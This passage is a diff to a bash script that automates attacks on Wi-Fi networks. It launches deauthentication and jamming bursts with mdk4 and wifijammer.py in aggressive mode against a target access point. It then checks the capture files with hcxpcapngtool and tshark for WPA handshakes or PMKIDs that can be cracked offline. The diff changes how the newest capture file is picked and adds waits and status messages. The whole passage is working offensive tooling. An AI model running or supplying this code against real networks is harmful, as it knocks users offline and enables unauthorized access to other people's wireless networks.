 echo " "
-hcxpcapngtool "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
+hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
+echo " "
+echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"
 
 rm /root/airlog-*
 kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
@@ -295,20 +312,22 @@ echo "continues attack process..."
 # ***************************************************************************************
 timeout 30s xterm -geometry '65x25+0+0' -e 'sleep 1 && mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
 echo " "
-echo "wifijammer attack ready after time -> 10s, and check handshake !!!" && sleep 10
+echo "wifijammer attack ready after time -> 10s, and check handshake !!!" && sleep 14
 echo " "
 # ***************** Check Handshake (8) *************************************************
-CHECK8="$(hcxpcapngtool hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
-# CHECK4="$(echo -e $(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
+CHECK8="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
+# CHECK8="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
 
 if [ "$CHECK8" = "CATCH" ]; then
 # CATCH value => yes ---
 echo "Captured handshake !!! :-)"
 
 echo " "
-hcxpcapngtool "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
+hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
+echo " "
+echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"
 
 rm /root/airlog-*
 kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
@@ -329,18 +348,23 @@ echo " "
 
 timeout 30s xterm -geometry '65x25+0+0' -e 'sleep 1 && python3 /root/wifijammer/wifijammer.py -a $(cat macadress.txt) -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d") -i $(cat interface.txt) --aggressive'
 
+# Final sleep ---
+sleep 15
+
 # ***************** Check Handshake (9) *************************************************
-CHECK9="$(hcxpcapngtool hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
-# CHECK4="$(echo -e $(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
+CHECK9="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
+# CHECK9="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
 
 if [ "$CHECK9" = "CATCH" ]; then
 # CATCH value => yes ---
 echo "Captured handshake !!! :-)"
 
 echo " "
-hcxpcapngtool "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
+hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
+echo " "
+echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"
 
 rm /root/airlog-*
 kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
@@ -349,7 +373,9 @@ exit
 else
 echo "No catch handshake (ignored)"
 echo " "
-echo "Failure, impossible to catch yet... :-( Exit the script !!!"
+echo "Failure, impossible to catch yet... :-("
+echo " "
+echo "Exit the script !!!"
 echo " "
 rm /root/airlog-*
 kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
